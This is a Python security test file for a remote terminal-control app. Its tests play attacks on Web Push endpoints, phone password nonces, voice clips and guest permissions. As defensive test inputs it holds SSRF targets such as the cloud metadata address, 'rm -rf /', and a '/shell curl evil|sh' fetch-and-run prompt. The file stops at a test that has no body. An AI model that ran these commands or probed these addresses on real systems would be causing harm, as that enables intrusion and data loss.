# SPDX-License-Identifier: GPL-3.0-or-later
"""The security review of the four things P0's review did not cover (#W5N2).

Web Push, password entry from a phone, voice from a phone and multiplayer all landed after the
P0 review, so each of their **(security)** paragraphs in `docs/REMOTE-PROTOCOL.md` is a claim
nobody had tried to break. This file is the trying: every test here is written as an attack, and
one that passes is the proof that the claim beside it holds.

Each test names the claim it is holding the code to, because a security test that only says what
it asserts is unreadable a month later — the interesting part is always *why* somebody thought
this was worth a rule.
"""
import asyncio
import contextlib
import json
import os
import ssl
import stat
import tempfile
import time
import unittest
import urllib.request
from pathlib import Path

from remote import audit as audit_mod
from remote import client as client_mod
from remote import devtls
from remote import gui_host
from remote import guests as guests_mod
from remote import host as host_mod
from remote import httpd
from remote import identity as identity_mod
from remote import notify as notify_mod
from remote import pane_state as pane_state_mod
from remote import panes as panes_mod
from remote import pairing, push, wire, ws
from rendezvous import server as rendezvous_mod
from rendezvous.server import Store, build
from tests.test_remote_control import SharedSource

APP_DIR = Path(__file__).resolve().parent.parent / "app"


def run(coroutine, timeout=60):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class Harness:
    """A rendezvous, a desktop with two panes, an owner who pairs and admits as told.

    The same shape as `tests/test_remote_guests.py`'s: real sockets, a real Noise session and the
    real hub, because everything under test here is an enforcement rule and a stubbed hub would
    only be testing the stub.
    """

    def __init__(self, capability=wire.FULL, admit=True, role=None, source=None):
        self.capability = capability
        self.admit = admit
        self.role = role
        self.source = source

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store, static_root=APP_DIR)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(self.directory)
        self.devices = identity_mod.DeviceStore(self.directory)
        self.guests = guests_mod.GuestStore(self.directory, devices=self.devices)
        if self.source is None:
            self.source = SharedSource()

        async def approver(request):
            return True, self.capability

        async def knock_approver(request):
            return self.admit, self.role or request.role

        self.host = host_mod.Host(self.identity, self.devices, self.source, app_base=self.base,
                                  approver=approver, knock_approver=knock_approver,
                                  guests=self.guests, name="test desktop")
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    async def paired(self, capability=None, *, name="Pixel 9"):
        if capability is not None:
            self.capability = capability
        url, _ = await self.host.open_pairing()
        pairing_client = client_mod.Client(self.base)
        record = await pairing_client.pair(url, name=name, platform="Chrome")
        await pairing_client.close()
        client = client_mod.Client(self.base)
        await client.connect(record)
        await client.expect("panes")
        return client, record

    async def invite(self, panes=("pane-1",), role=wire.VIEWER, **kwargs):
        return await self.host.invite_create(list(panes), role, **kwargs)

    async def guest(self, url, name="alice"):
        client = client_mod.Client(self.base)
        joined = await client.knock(url, name=name, platform="Chrome")
        return client, joined

    def audit_lines(self):
        return [json.loads(line) for path in sorted(self.directory.glob("audit-*.jsonl"))
                for line in path.read_text().splitlines()]


async def refusal(client, kind: str, message: dict, timeout: float = 10.0) -> dict:
    """Send a message and return the `error` it comes back with, failing if it is obeyed."""
    await client.send({"t": kind, **message})
    return await client.expect("error", timeout=timeout)


# ---- 1. Web Push (section 9) --------------------------------------------------------------------

class PushEndpointTests(unittest.TestCase):
    """**(security)** section 8: the rendezvous is handed "only the opaque endpoint URL plus
    ciphertext".

    Opaque is not the same as unchecked. A `view` phone — the weakest capability there is —
    chooses the endpoint, and the rendezvous then makes an authenticated POST to it with bytes
    the phone also chose. Without a rule about *which* hosts that may be, the push route is a
    request forgery engine: the phone points it at `https://10.0.0.1/…` and the rendezvous, which
    is the one process on the hosted side with a network, makes the request.
    """

    def test_a_private_address_is_refused_before_the_desktop_stores_it(self):
        for endpoint in ("https://127.0.0.1/subscription/one",
                         "https://10.1.2.3/subscription/one",
                         "https://[::1]/subscription/one",
                         "https://169.254.169.254/latest/meta-data",
                         "https://192.168.0.1:8443/x"):
            with self.subTest(endpoint=endpoint):
                with self.assertRaises(wire.WireError):
                    notify_mod.clean_subscription(self.subscription(endpoint))

    def test_a_url_carrying_credentials_is_refused(self):
        with self.assertRaises(wire.WireError):
            notify_mod.clean_subscription(
                self.subscription("https://fcm.googleapis.com@127.0.0.1/x"))

    def test_an_ordinary_push_endpoint_still_passes(self):
        for endpoint in ("https://fcm.googleapis.com/fcm/send/abc",
                         "https://updates.push.services.mozilla.com/wpush/v2/abc",
                         "https://push.example.com/v1/subscription/abc"):
            with self.subTest(endpoint=endpoint):
                cleaned = notify_mod.clean_subscription(self.subscription(endpoint))
                self.assertEqual(cleaned["endpoint"], endpoint)

    def test_the_rendezvous_refuses_a_host_that_is_not_a_push_service(self):
        """The desktop's check is the phone's error message; this one is the boundary.

        Anyone may register a desktop with a rendezvous — registration proves possession of a
        key, not that the owner of that key is welcome — so `/v1/push/send` is reachable by
        anybody who can reach the server at all. If it will POST wherever it is told, it is an
        SSRF proxy sitting inside whatever network the rendezvous is hosted on.
        """
        async def main():
            async with Harness() as harness:
                for endpoint in ("https://169.254.169.254/latest/meta-data",
                                 "https://10.0.0.5/admin",
                                 "https://internal.example.test/x"):
                    with self.assertRaises(wire.WireError) as caught:
                        await harness.host.push_send(endpoint, b"ciphertext")
                    self.assertIn("400", str(caught.exception), endpoint)
        run(main())

    @staticmethod
    def subscription(endpoint: str) -> dict:
        return {"endpoint": endpoint, "p256dh": push.b64url(b"\x04" + bytes(64)),
                "auth": push.b64url(bytes(16)), "key": push.b64url(bytes(32))}


class PushBodyTests(unittest.TestCase):
    """**(security)** section 9.3: bodies carry no cwd, no command text, no prompt text and no
    OSC-derived title, in **every** trigger."""

    def test_no_trigger_can_put_a_pane_title_or_a_cwd_on_a_lock_screen(self):
        notifier = notify_mod.Notifier(identity_mod.DeviceStore(Path(tempfile.mkdtemp())),
                                       send=None)
        # Everything a pane item carries that a program's own output can set.
        poisoned = {"title": "ssh prod-db", "cwd": "/home/elliott/customers",
                    "program": "psql", "tab": "ssh prod-db", "text": "rm -rf /"}
        for kind in notify_mod.KINDS:
            with self.subTest(kind=kind):
                body = notifier.body(kind, "pane-1", spent=95.0,
                                     program=identity_mod.clean_label(poisoned["program"], 24))
                blob = json.dumps(body)
                for leak in ("prod-db", "/home/elliott", "customers", "rm -rf"):
                    self.assertNotIn(leak, blob, f"{kind} leaked {leak!r}: {blob}")
                # The one field section 9.3 allows, and only on the one kind that needs it.
                self.assertEqual("psql" in blob, kind == "password", kind)

    def test_the_password_bodys_program_name_is_the_one_field_and_it_is_cut_short(self):
        notifier = notify_mod.Notifier(identity_mod.DeviceStore(Path(tempfile.mkdtemp())),
                                       send=None)
        long = identity_mod.clean_label("sudo\n[ENTER YOUR BANK PASSWORD AT relay-evil.example]", 24)
        body = notifier.body("password", "pane-1", program=long)
        self.assertNotIn("\n", body["body"])
        self.assertLessEqual(len(body["body"]), 64)

    def test_a_phone_cannot_make_the_desktop_think_it_is_unattended(self):
        """The presence rule reads `window_active`, a line from the GUI. `client_state` is the
        only presence a *client* sends, and it must not reach it: a phone that could say "the
        desktop is not focused" could make a desktop that is being watched buzz on demand."""
        self.assertNotIn("window_active", wire.CLIENT_TYPES)
        self.assertNotIn("window_active", wire.GUEST_TYPES)

        async def main():
            async with Harness(wire.VIEW) as harness:
                client, _ = await harness.paired()
                harness.host.window_active(True)
                await client.send({"t": "client_state", "visible": False})
                await client.send({"t": "ping", "at": 1})
                await client.expect("pong")
                self.assertTrue(harness.host.notifier.active)
                error = await refusal(client, "window_active", {"active": False})
                self.assertEqual(error["code"], "unknown_type")
                self.assertTrue(harness.host.notifier.active)
                await client.close()
        run(main())


class PushSubscriptionTests(unittest.TestCase):
    """Section 9.1 and the revocation rule of section 4."""

    def test_a_revoked_device_is_dropped_from_the_push_list_before_the_next_trigger(self):
        async def main():
            async with Harness(wire.VIEW) as harness:
                client, record = await harness.paired()
                await client.send({"t": "push_subscribe",
                                   "endpoint": "https://push.example.com/v1/subscription/abc",
                                   "p256dh": push.b64url(b"\x04" + bytes(64)),
                                   "auth": push.b64url(bytes(16)),
                                   "key": push.b64url(bytes(32))})
                await client.expect("push_state")
                sent: list = []
                harness.host.notifier.send = lambda endpoint, payload: sent.append(endpoint)
                harness.devices.revoke(record.device_id)
                self.assertIsNone(harness.devices.devices[record.device_id].push)
                harness.host.notifier.active = False
                harness.host.notifier.fire("password", "pane-1", program="sudo")
                await asyncio.sleep(0.1)
                self.assertEqual(sent, [])
                await client.close()
        run(main())

    def test_a_guest_can_neither_subscribe_nor_unsubscribe(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                client, _ = await harness.guest(url)
                for kind in ("push_subscribe", "push_unsubscribe"):
                    error = await refusal(client, kind, {
                        "endpoint": "https://push.example.com/v1/subscription/abc",
                        "p256dh": push.b64url(b"\x04" + bytes(64)),
                        "auth": push.b64url(bytes(16)), "key": push.b64url(bytes(32))})
                    self.assertEqual(error["code"], "not_permitted")
                self.assertTrue(all(device.push is None for device in harness.devices.live()))
                await client.close()
        run(main())


# ---- 2. Password entry (section 6.7) --------------------------------------------------------------

class SecretNonceTests(unittest.TestCase):
    """**(security)** section 6.7: the nonce is "single use, bound to (pane, foreground pid,
    prompt generation), and expires in seconds"."""

    def test_the_nonce_dies_with_the_prompt_it_was_minted_for(self):
        """The attack: `ssh` asks for a key passphrase, the person answers it from the phone, and
        the same process then asks for a password. The phone is still holding the first prompt's
        permit. If that permit is still good, the second secret is written on the strength of a
        decision the person made about the first one — and a permit is exactly the thing that is
        supposed to say *which* prompt was answered.
        """
        async def main():
            async with Harness() as harness:
                source = harness.source
                source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=99)
                first = harness.host._items()
                nonce = [item for item in first if item["id"] == "pane-1"][0]["secret_nonce"]
                self.assertTrue(nonce)

                source.set_password_prompt("pane-1", False)
                harness.host._items()
                self.assertNotIn("pane-1", harness.host.secret_nonces,
                                 "a permit outlived the prompt it was minted for")

                source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=99)
                again = harness.host._items()
                fresh = [item for item in again if item["id"] == "pane-1"][0]["secret_nonce"]
                self.assertNotEqual(fresh, nonce, "the new prompt reused the old prompt's permit")
        run(main())

    def test_a_password_sent_with_the_previous_prompts_nonce_is_refused(self):
        """The same thing from the wire, which is where it matters."""
        async def main():
            async with Harness() as harness:
                client, record = await harness.paired(wire.FULL)
                harness.devices.set_password_entry(record.device_id, True)
                source = harness.source
                source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=99)
                panes = await client.expect("panes")
                nonce = [item for item in panes["items"]
                         if item["id"] == "pane-1"][0]["secret_nonce"]

                source.set_password_prompt("pane-1", False)
                await client.expect("panes")
                source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=99)
                await client.expect("panes")

                error = await refusal(client, "secret_input",
                                      {"pane": "pane-1", "nonce": nonce,
                                       "bytes": pairing.b64(b"hunter2")})
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(source._secrets, [], "a stale permit wrote a password")
                await client.close()
        run(main())

    def test_one_nonce_writes_one_password_and_a_replay_writes_nothing(self):
        async def main():
            async with Harness() as harness:
                client, record = await harness.paired(wire.FULL)
                harness.devices.set_password_entry(record.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11,
                                                   foreground_pid=99)
                panes = await client.expect("panes")
                nonce = [item for item in panes["items"]
                         if item["id"] == "pane-1"][0]["secret_nonce"]
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": pairing.b64(b"hunter2")})
                await client.expect("agent")
                self.assertEqual(harness.source._secrets, [("pane-1", b"hunter2")])
                error = await refusal(client, "secret_input",
                                      {"pane": "pane-1", "nonce": nonce,
                                       "bytes": pairing.b64(b"again")})
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(len(harness.source._secrets), 1)
                await client.close()
        run(main())

    def test_a_nonce_is_not_good_on_another_pane(self):
        async def main():
            async with Harness() as harness:
                client, record = await harness.paired(wire.FULL)
                harness.devices.set_password_entry(record.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11,
                                                   foreground_pid=99)
                panes = await client.expect("panes")
                nonce = [item for item in panes["items"]
                         if item["id"] == "pane-1"][0]["secret_nonce"]
                error = await refusal(client, "secret_input",
                                      {"pane": "pane-2", "nonce": nonce,
                                       "bytes": pairing.b64(b"hunter2")})
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.source._secrets, [])
                await client.close()
        run(main())

    def test_the_password_bytes_are_in_no_audit_line_and_no_stream(self):
        async def main():
            async with Harness() as harness:
                client, record = await harness.paired(wire.FULL)
                harness.devices.set_password_entry(record.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11,
                                                   foreground_pid=99)
                panes = await client.expect("panes")
                nonce = [item for item in panes["items"]
                         if item["id"] == "pane-1"][0]["secret_nonce"]
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": pairing.b64(b"hunter2")})
                await client.expect("agent")
                blob = json.dumps(harness.audit_lines())
                self.assertIn("secret_input", blob)
                self.assertNotIn("hunter2", blob)
                self.assertNotIn(pairing.b64(b"hunter2"), blob)
                # Section 6.7: it carries no `seq`, so it is in no ring and no replay.
                for stream in harness.host.streams.values():
                    for message in stream.ring:
                        self.assertNotIn("hunter2", json.dumps(message))
                await client.close()
        run(main())

    def test_a_full_device_without_the_switch_cannot_type_the_password_some_other_way(self):
        """Section 6.6: while the pane is at a password prompt, `secret_input` is the **only**
        accepted input. Otherwise the whole of 6.7 is optional from the attacker's side — a full
        device watches for `status: "password"` and sends `line {text: "hunter2"}`."""
        async def main():
            async with Harness() as harness:
                client, record = await harness.paired(wire.FULL)
                self.assertFalse(harness.devices.get(record.device_id).password_entry)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11,
                                                   foreground_pid=99)
                await client.expect("panes")
                for kind, body in (("line", {"text": "hunter2"}),
                                   ("paste", {"text": "hunter2"}),
                                   ("keys", {"bytes": pairing.b64(b"hunter2\r")})):
                    error = await refusal(client, kind, {"pane": "pane-1", **body})
                    self.assertEqual(error["code"], "not_permitted", kind)
                panes = await client.expect("panes", timeout=2) if False else None
                blob = json.dumps(harness.audit_lines())
                self.assertNotIn("hunter2", blob, "a refused line was written to the audit log")
                await client.close()
        run(main())

    def test_a_guest_is_never_handed_the_permit_and_may_not_use_one(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                client, _ = await harness.guest(url)
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                harness.source.set_password_prompt("pane-1", True, shell_pid=11,
                                                   foreground_pid=99)
                panes = await client.expect("panes")
                for item in panes["items"]:
                    self.assertNotIn("secret_nonce", item)
                nonce = harness.host.secret_nonces["pane-1"].value
                error = await refusal(client, "secret_input",
                                      {"pane": "pane-1", "nonce": nonce,
                                       "bytes": pairing.b64(b"hunter2")})
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.source._secrets, [])
                await client.close()
        run(main())


# ---- 3. Voice (section 6.6) ------------------------------------------------------------------------

class VoiceTests(unittest.TestCase):
    def test_a_clip_that_is_too_big_or_the_wrong_format_never_reaches_the_worker(self):
        async def main():
            async with Harness(wire.AGENT) as harness:
                client, _ = await harness.paired()
                error = await refusal(client, "voice", {"pane": "pane-1", "format": "../../etc",
                                                        "data": pairing.b64(b"x")})
                self.assertEqual(error["code"], "unknown_type")
                oversize = "A" * (host_mod.MAX_VOICE_BYTES * 4 // 3 + 64)
                error = await refusal(client, "voice", {"pane": "pane-1", "format": "webm",
                                                        "data": oversize})
                self.assertEqual(error["code"], "unknown_type")
                await client.close()
        run(main())

    def test_a_guest_can_never_spend_the_owners_provider_key_on_a_clip(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                client, _ = await harness.guest(url)
                error = await refusal(client, "voice", {"pane": "pane-1", "format": "webm",
                                                        "data": pairing.b64(b"clip")})
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_a_transcript_is_never_handed_to_the_device_that_did_not_record_it(self):
        """The sidecar mints the clip's id so two clips in flight cannot be answered with each
        other's text (`remote/gui_host.py`). An answer with no id is the older GUI's spelling,
        and it must not be resolved by guessing which of two waiting clips it belongs to: a
        transcript is a recording of somebody speaking, and the wrong phone is the wrong person.
        """
        lines: list = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "t", "cwd": "/", "rows": 24, "cols": 80})

        async def main():
            first = asyncio.ensure_future(source.transcribe("p1", b"one", "webm"))
            second = asyncio.ensure_future(source.transcribe("p1", b"two", "webm"))
            await asyncio.sleep(0.05)
            self.assertEqual(len(source._voice), 2)
            source.voice_reply({"t": "transcribed", "pane": "p1", "ok": True,
                                "text": "the first speaker's words"})
            await asyncio.sleep(0.05)
            self.assertFalse(first.done() or second.done(),
                             "an unaddressed answer was handed to one of two waiting clips")
            for request, (_, future) in list(source._voice.items()):
                future.set_result({"ok": True, "text": request})
            await first
            await second

        run(main())

    def test_an_unaddressed_answer_still_resolves_the_only_clip_waiting(self):
        lines: list = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "t", "cwd": "/", "rows": 24, "cols": 80})

        async def main():
            only = asyncio.ensure_future(source.transcribe("p1", b"one", "webm"))
            await asyncio.sleep(0.05)
            source.voice_reply({"t": "transcribed", "pane": "p1", "ok": True, "text": "hello"})
            self.assertEqual(await only, "hello")

        run(main())


# ---- 4. Multiplayer (section 10) ---------------------------------------------------------------

class GuestReachTests(unittest.TestCase):
    """Section 10.1: "any message naming another pane is `not_permitted`, and no event for
    another pane is ever fanned out to them"."""

    EVERY_PANE_MESSAGE = [
        ("pane_focus", {}), ("pane_blur", {}), ("screen_get", {}),
        ("history_get", {"count": 10}), ("compose", {"text": "hello"}),
        ("keys", {"bytes": pairing.b64(b"x")}), ("paste", {"text": "x"}),
        ("line", {"text": "x"}), ("plan_execute", {"plan_id": "abc123"}),
        ("queue_remove", {"item_id": "1", "row": "entry:1"}), ("agent_stop", {}),
        ("tool_output_get", {"tool_id": "t1"}), ("turn_transcript_get", {"turn_id": "t1"}),
        ("recap_request", {}), ("set_mode", {"mode": "auto"}),
        ("voice", {"format": "webm", "data": pairing.b64(b"x")}),
        ("secret_input", {"nonce": "x", "bytes": pairing.b64(b"x")}),
        ("control_request", {}), ("control_release", {}),
        ("pane_state_get", {}), ("queue_move", {"row": "entry:1", "to": "up"}),
        ("queue_edit", {"row": "entry:1"}), ("queue_send_now", {"row": "entry:1"}),
        ("model_pick", {"choice": "m1"}), ("conversation_new", {}),
    ]

    def test_no_message_at_all_reaches_the_pane_a_guest_was_not_invited_to(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(panes=("pane-1",), role=wire.EDITOR)
                client, _ = await harness.guest(url)
                for kind, body in self.EVERY_PANE_MESSAGE:
                    with self.subTest(kind=kind):
                        error = await refusal(client, kind, {"pane": "pane-2", **body})
                        self.assertEqual(error["code"], "not_permitted", f"{kind}: {error}")
                await client.close()
        run(main())

    def test_a_guest_cannot_resume_a_stream_belonging_to_a_pane_that_is_not_theirs(self):
        """`resume` names streams rather than a pane, so the inbound pane check cannot see it.
        The outbound one in `Channel.send` is what has to hold."""
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(panes=("pane-1",), role=wire.VIEWER)
                client, _ = await harness.guest(url)
                await harness.source.compose("pane-2", "the owner's private prompt",
                                             to_agent=True, when="now", origin="local")
                await asyncio.sleep(0.3)
                await client.send({"t": "resume", "streams": {"agent:pane-2": 0,
                                                              "screen:pane-2": 0}})
                resumed = await client.expect("resumed")
                seen = []
                while True:
                    try:
                        seen.append(await client.expect("agent", timeout=0.6))
                    except Exception:
                        break
                self.assertEqual(seen, [], f"a guest replayed another pane: {seen}")
                self.assertIn("resumed", resumed["t"])
                await client.close()
        run(main())

    def test_a_guest_never_learns_what_anybody_else_typed(self):
        """Section 10.1: "a queue event carries only this guest's own text"."""
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(panes=("pane-1",), role=wire.EDITOR)
                client, joined = await harness.guest(url)
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                await asyncio.sleep(0.2)
                harness.source._emit("pane-1", {
                    "event": "queued", "id": "q1", "when": "queue", "position": 0,
                    "origin": "user", "text": "the owner's secret prompt",
                    "preview": "the owner's secret prompt", "prompt": "the owner's secret prompt"})
                harness.source._emit("pane-1", {
                    "event": "queue_changed", "running": None, "paused": False,
                    "items": [{"id": "q1", "preview": "the owner's secret prompt",
                               "origin": "user"}],
                    "steering": [{"id": "q2", "preview": "another guest's steer",
                                  "origin": "guest:someone-else"}]})
                blob = ""
                for _ in range(2):
                    blob += json.dumps(await client.expect("agent"))
                self.assertNotIn("secret prompt", blob, blob)
                self.assertNotIn("another guest's steer", blob, blob)
                self.assertIn("the owner", blob)
                await client.close()
        run(main())

    def test_every_server_type_is_either_named_for_guests_or_provably_not_sent_to_one(self):
        """Section 10.1: outbound is an allow-list. This is the test that keeps it one — a new
        desktop→client type reaches a guest the day somebody adds it to `GUEST_SERVER_TYPES`,
        not the day it lands."""
        for kind in sorted(wire.SERVER_TYPES):
            allowed = kind in wire.GUEST_SERVER_TYPES
            self.assertEqual(wire.may_send_to_guest(kind), allowed, kind)
        self.assertTrue(wire.GUEST_SERVER_TYPES <= wire.SERVER_TYPES)
        for kind in ("paired", "revoked", "push_state", "transport_switched", "pane_state",
                     "queue_edit_text"):
            self.assertFalse(wire.may_send_to_guest(kind), kind)

    def test_a_participant_record_cannot_be_made_into_a_device_record(self):
        """Section 10.2: "a participant record is never a device record". Try it from both ends:
        a guest's pinned key knocking again, and a guest's key offered to pairing."""
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                client, joined = await harness.guest(url)
                self.assertEqual(harness.devices.live(), [])

                # The same key, now offering itself for pairing on a pairing room.
                pair_url, _ = await harness.host.open_pairing()
                impostor = client_mod.Client(harness.base,
                                             static_private=client.static_private)
                with self.assertRaises(Exception):
                    await impostor.pair(pair_url, name="Pixel 9", platform="Chrome")
                await impostor.close()
                self.assertEqual([d.device_id for d in harness.devices.live()], [])

                # ... and a second invite, which would be a second record for one key.
                _, second = await harness.invite(panes=("pane-2",), role=wire.EDITOR)
                again = client_mod.Client(harness.base, static_private=client.static_private)
                with self.assertRaises(Exception):
                    await again.knock(second, name="alice", platform="Chrome")
                await again.close()
                live = [p for p in harness.guests.live()]
                self.assertEqual(len(live), 1)
                self.assertEqual(live[0].panes, ["pane-1"])
                await client.close()
        run(main())

    def test_a_removed_guests_key_is_refused_and_told_to_forget_the_record(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                client, joined = await harness.guest(url)
                await harness.host.participant_remove(joined.participant)
                bye = await client.expect("bye")
                self.assertTrue(bye.get("discard"))
                await client.close()

                again = client_mod.Client(harness.base,
                                          static_private=client.static_private)
                with self.assertRaises(Exception):
                    await again.rejoin(joined)
                await again.close()
        run(main())


class GuestControlTests(unittest.TestCase):
    def test_an_editor_who_never_asked_cannot_type(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                client, _ = await harness.guest(url)
                for kind, body in (("keys", {"bytes": pairing.b64(b"rm -rf /\r")}),
                                   ("line", {"text": "rm -rf /"}),
                                   ("paste", {"text": "rm -rf /"})):
                    error = await refusal(client, kind, {"pane": "pane-1", **body})
                    self.assertEqual(error["code"], "not_driving", kind)
                await client.close()
        run(main())

    def test_the_keyboard_goes_back_to_the_owner_on_every_way_of_losing_it(self):
        """Section 10.3: "a holder who disconnects, is removed, is demoted to viewer, whose
        record expires, or whose share is paused loses it at once"."""
        async def main():
            for ending in ("remove", "demote", "pause", "expire", "take"):
                with self.subTest(ending=ending):
                    async with Harness() as harness:
                        _, url = await harness.invite(role=wire.EDITOR)
                        client, joined = await harness.guest(url)
                        self.assertTrue(harness.host.grant_control("pane-1",
                                                                   joined.participant))
                        await client.expect("control")
                        if ending == "remove":
                            await harness.host.participant_remove(joined.participant)
                        elif ending == "demote":
                            await harness.host.role_set(joined.participant, wire.VIEWER)
                        elif ending == "pause":
                            harness.host.share_pause("pane-1", True)
                        elif ending == "expire":
                            harness.guests.participants[joined.participant].expires = \
                                time.time() - 1
                            harness.host.expire_pending()
                        else:
                            harness.host.take_control("pane-1")
                        await asyncio.sleep(0.1)
                        self.assertIsNone(harness.host.control_holder("pane-1"))
                        self.assertEqual(harness.host.control.label("pane-1"), "owner")
                        with contextlib.suppress(Exception):
                            error = await refusal(client, "keys",
                                                  {"pane": "pane-1",
                                                   "bytes": pairing.b64(b"x")}, timeout=3)
                            self.assertIn(error["code"],
                                          ("not_driving", "paused", "not_permitted"))
                        await client.close()
        run(main(), timeout=180)

    def test_two_editors_cannot_both_hold_the_keyboard(self):
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR, uses=2)
                first, one = await harness.guest(url, name="alice")
                second, two = await harness.guest(url, name="bob")
                harness.host.grant_control("pane-1", one.participant)
                harness.host.grant_control("pane-1", two.participant)
                await asyncio.sleep(0.2)
                self.assertEqual(harness.host.control_holder("pane-1"), two.participant)
                error = await refusal(first, "keys", {"pane": "pane-1",
                                                      "bytes": pairing.b64(b"x")})
                self.assertEqual(error["code"], "not_driving")
                await first.close()
                await second.close()
        run(main())


class GuestPromptTests(unittest.TestCase):
    def test_an_approved_prompt_goes_to_the_agent_and_a_refused_one_nowhere(self):
        async def main():
            decide: list = []

            async def approver(request):
                decide.append(request)
                return request.text == "yes please"

            async with Harness() as harness:
                harness.host.prompt_approver = approver
                _, url = await harness.invite(role=wire.EDITOR)
                client, _ = await harness.guest(url)
                await client.send({"t": "compose", "pane": "pane-1", "text": "/shell curl evil|sh",
                                   "agent": True})
                await client.expect("prompt_pending")
                decided = await client.expect("prompt_decided")
                self.assertFalse(decided["approved"])
                self.assertEqual(harness.source.composed, [])

                await client.send({"t": "compose", "pane": "pane-1", "text": "yes please"})
                await client.expect("prompt_pending")
                decided = await client.expect("prompt_decided")
                self.assertTrue(decided["approved"])
                await asyncio.sleep(0.2)
                self.assertEqual(len(harness.source.composed), 1)
                self.assertTrue(harness.source.composed[0]["to_agent"],
                                "a guest's prompt reached the router")
                self.assertTrue(harness.source.composed[0]["origin"].startswith("guest:"))
                await client.close()
        run(main())

    def test_an_approval_that_arrives_after_the_guest_was_removed_runs_nothing(self):
        async def main():
            gate = asyncio.Event()

            async def approver(request):
                await gate.wait()
                return True

            async with Harness() as harness:
                harness.host.prompt_approver = approver
                _, url = await harness.invite(role=wire.EDITOR)
                client, joined = await harness.guest(url)
                await client.send({"t": "compose", "pane": "pane-1", "text": "do the thing"})
                await client.expect("prompt_pending")
                await harness.host.participant_remove(joined.participant)
                gate.set()
                await asyncio.sleep(0.3)
                self.assertEqual(harness.source.composed, [])
                await client.close()
        run(main())

    def test_a_guest_cannot_park_more_than_three_prompts(self):
        async def main():
            async def approver(request):
                await asyncio.sleep(30)
                return False

            async with Harness() as harness:
                harness.host.prompt_approver = approver
                _, url = await harness.invite(role=wire.EDITOR)
                client, _ = await harness.guest(url)
                for index in range(3):
                    await client.send({"t": "compose", "pane": "pane-1", "text": f"n {index}"})
                    await client.expect("prompt_pending")
                error = await refusal(client, "compose", {"pane": "pane-1", "text": "one more"})
                self.assertEqual(error["code"], "busy")
                await client.close()
        run(main())

    def test_the_owners_approval_seam_is_not_reachable_from_any_client(self):
        async def main():
            async with Harness() as harness:
                owner, _ = await harness.paired(wire.FULL)
                _, url = await harness.invite(role=wire.EDITOR)
                guest, joined = await harness.guest(url)
                for who in (owner, guest):
                    for kind in sorted(wire.OWNER_ONLY):
                        error = await refusal(who, kind, {"pane": "pane-1", "approve": True,
                                                          "grant": True, "admit": True,
                                                          "participant": joined.participant,
                                                          "role": "editor", "id": "x",
                                                          "on": True})
                        self.assertEqual(error["code"], "not_permitted", kind)
                await owner.close()
                await guest.close()
        run(main(), timeout=120)


class IdentityStorageTests(unittest.TestCase):
    """The keyring holds the profile's identity and nothing else.

    A test, or the CLI's ``--state``, names its own directory; the identity it makes must live
    there. Before this rule, running any remote test module directly wrote a fresh key into the
    owner's real keyring entry, and every phone he had paired stopped matching the pinned key.
    """

    def test_an_identity_with_a_directory_never_touches_the_keyring(self):
        import remote.identity as identity_mod
        calls = []

        def forbidden():
            calls.append("secret-tool")
            return "/nonexistent/secret-tool"

        original = identity_mod.Identity._secret_tool
        identity_mod.Identity._secret_tool = staticmethod(forbidden)
        try:
            with tempfile.TemporaryDirectory() as directory:
                made = identity_mod.Identity.create(Path(directory))
                self.assertTrue((Path(directory) / "identity.key").is_file())
                self.assertEqual(stat.S_IMODE((Path(directory) / "identity.key").stat().st_mode),
                                 0o600)
                loaded = identity_mod.Identity.load(Path(directory))
                self.assertEqual(loaded.public, made.public)
        finally:
            identity_mod.Identity._secret_tool = original
        self.assertEqual(calls, [], "an explicit directory must never reach the keyring")


class AuditTests(unittest.TestCase):
    def test_the_log_is_0600_from_the_moment_it_exists(self):
        """Section 10.6: 0600 inside a 0700 directory, "as `logs.py` requires of every Relay log".

        Written with `open(..., "a")` and chmod-ed afterwards, the file is world-readable for the
        length of the first write — and the first line of an audit log is a pairing or a knock.
        The test therefore holds the mode *before* any chmod could fix it.
        """
